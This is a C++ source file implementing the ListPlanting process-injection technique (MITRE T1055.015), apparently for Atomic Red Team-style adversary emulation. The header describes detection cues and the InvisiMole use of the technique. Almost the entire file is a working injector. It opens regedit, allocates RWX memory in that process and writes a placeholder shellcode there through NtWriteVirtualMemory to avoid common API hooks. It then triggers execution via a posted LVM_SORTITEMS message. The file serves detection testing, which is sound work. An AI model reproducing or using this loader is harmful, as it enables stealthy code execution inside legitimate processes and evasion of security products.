/*
MITRE T1055.015
Code injection ListPlanting
Author: Thomas X Meng
ListPlanting is a method of executing arbitrary code in the address space 
of a remote benign process. Code executed via ListPlanting may also evade 
detection from security products since the execution is masked under a legitimate 
process and triggered by PostMessage. Detection: detect the suspicious process call 
child SysListView32 of high privilege victim process detect the PostMessage or 
SendMessage API with suspicious payload that resides in section with RWX permissions 
with behavioural analysis.
Technique used by InvisiMole. 
payload will spwan a message box with "Atomic Red Team" and a notepad.exe
Code reference: 
https://modexp.wordpress.com/2019/04/25/seven-window-injection-methods/
*/

#define UNICODE
#define _UNICODE
#include <windows.h>
#include <commctrl.h>
#include <iostream>
#pragma comment (lib, "user32.lib")

// Define the NtWriteVirtualMemory prototype
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

// Manually define STATUS_SUCCESS.
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

struct EnumData {
    LPCWSTR title;
    HWND hwnd;
};

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    EnumData* data = (EnumData*)lParam;
    wchar_t title[256];
    GetWindowText(hwnd, title, 256);
    if (wcsstr(title, data->title) != NULL) {
        data->hwnd = hwnd;
        return FALSE; // Stop enumerating
    }
    return TRUE; // Continue enumerating
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    EnumData* data = (EnumData*)lParam;
    wchar_t className[256];
    GetClassName(hwnd, className, 256);
    if (wcscmp(className, data->title) == 0) {
        data->hwnd = hwnd;
        return FALSE; 
    }
    return TRUE; 
}

unsigned char magiccode[] = ####SHELLCODE####;


int main(int argc, char* argv[]) {
    std::cout << "[+] Starting the program." << std::endl;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Zeroing STARTUPINFO and PROCESS_INFORMATION structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create a process for the Windows Registry Editor
    if (!CreateProcess(L"C:\\Windows\\regedit.exe",   // the path
        NULL,           // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)            // Pointer to PROCESS_INFORMATION structure
        ) 
    {
        std::cerr << "[-] CreateProcess failed (" << GetLastError() << ").\n";
        return -1;
    }

    Sleep(2000);

    HANDLE ph;
    DWORD pid;
    LPVOID mem;
    EnumData data;

    // Find the "Registry Editor" window
    std::cout << "[+] Looking for the 'Registry Editor' window..." << std::endl;
    data.title = L"Registry Editor";
    data.hwnd = NULL;
    EnumWindows(EnumWindowsProc, (LPARAM)&data);
    HWND wpw = data.hwnd;
    if (!wpw) {
        std::cerr << "[-] Failed to find window. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Find the "SysListView32" child window
    std::cout << "[+] Looking for the 'SysListView32' window..." << std::endl;
    data.title = L"SysListView32";
    data.hwnd = NULL;
    EnumChildWindows(wpw, EnumChildProc, (LPARAM)&data);
    HWND hw = data.hwnd;
    if (!hw) {
        std::cerr << "[-] Failed to find list view. Error: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "[+] Getting the process ID..." << std::endl;
    GetWindowThreadProcessId(hw, &pid);
    if (pid == 0) {
        std::cerr << "[-] Failed to get process ID. Error: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "[+] Opening the process..." << std::endl;
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!ph) {
        std::cerr << "[-] Failed to open process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Allocate RWX memory
    std::cout << "[+] Allocating memory in the remote process..." << std::endl;
    mem = VirtualAllocEx(ph, NULL, sizeof(magiccode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        std::cerr << "[-] Failed to allocate memory. Error: " << GetLastError() << std::endl;
        CloseHandle(ph);
        return 1;
    }

    // Get a handle to ntdll.dll where the function resides
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        std::cerr << "[-] Failed to get handle to ntdll.dll" << std::endl;
        return 1;
    }

    // Get the NtWriteVirtualMemory function address
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    if (!NtWriteVirtualMemory) {
        std::cerr << "[-] Failed to get address of NtWriteVirtualMemory" << std::endl;
        return 1;
    }

    // Use NtWriteVirtualMemory instead of WriteProcessMemory
    std::cout << "[+] Writing memory to the remote process..." << std::endl;
    NTSTATUS status = NtWriteVirtualMemory(ph, mem, magiccode, sizeof(magiccode), NULL);
    if (status != STATUS_SUCCESS) {
        std::cerr << "[-] NtWriteVirtualMemory failed. Status: " << std::hex << status << std::endl;
        VirtualFreeEx(ph, mem, 0, MEM_RELEASE);
        CloseHandle(ph);
        return 1;
    }


    if (!hw) {
        std::cerr << "[-] Failed to find list view. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Check if there is at least one item in the list
    // This is relevant in case of other remote process as target.
    int itemCount = ListView_GetItemCount(hw);
    if (itemCount <= 0) {
        std::cerr << "[-] List view is empty." << std::endl;
        // Handle the empty list case here, wait, retry, or exit?
        return 1;
    }

    // Trigger payload
    std::cout << "[+] Posting message to the target window..." << std::endl;
    if (!PostMessage(hw, LVM_SORTITEMS, 0, (LPARAM)mem)) {
        std::cerr << "[-] Failed to post message. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(ph, mem, 0, MEM_RELEASE);
        CloseHandle(ph);
        return 1;
    }

    Sleep(8000); // Wait for 5 seconds to allow the payload to execute

    // Attempt to terminate the process (Regedit)
    if (!TerminateProcess(pi.hProcess, 0)) {
        std::cerr << "[-] Failed to terminate process. Error: " << GetLastError() << std::endl;
        // handle error 25519
    } else {
        std::cout << "[+] RegEdit process termination successfull." << std::endl;
    }

    // Wait for the process to exit
    WaitForSingleObject(pi.hProcess, INFINITE);
    // Clean up
    VirtualFreeEx(ph, mem, 0, MEM_RELEASE);
    CloseHandle(ph);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::cout << "[+] Payload executed successfully." << std::endl;

    return 0;
}